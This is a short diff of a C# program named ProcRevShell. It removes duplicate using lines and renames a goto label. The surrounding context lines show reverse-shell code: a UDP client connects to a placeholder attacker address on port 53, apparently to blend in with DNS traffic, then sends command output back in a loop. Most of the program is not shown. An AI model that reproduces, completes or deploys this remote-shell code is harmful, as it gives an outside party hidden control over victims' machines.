@@ -6,9 +6,7 @@ using System.ComponentModel;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
-using System;
 using System.Collections.Generic;
-using System.Linq;
 
 
 namespace ProcRevShell
@@ -19,7 +17,7 @@ namespace ProcRevShell
 		public static void Main(string[] args)
 		{
 			UdpClient udpClient = new UdpClient(11000);
-			jacque:	
+			reto:	
 
 			try{
 				udpClient.Connect ("IP", 53);
@@ -63,7 +61,7 @@ namespace ProcRevShell
 					Byte[] outputtobytes = Encoding.ASCII.GetBytes(output);
 
 					udpClient.Send(outputtobytes, outputtobytes.Length);
-				goto jacque;
+				goto reto;
 				}
 				
 				udpClient.Close();
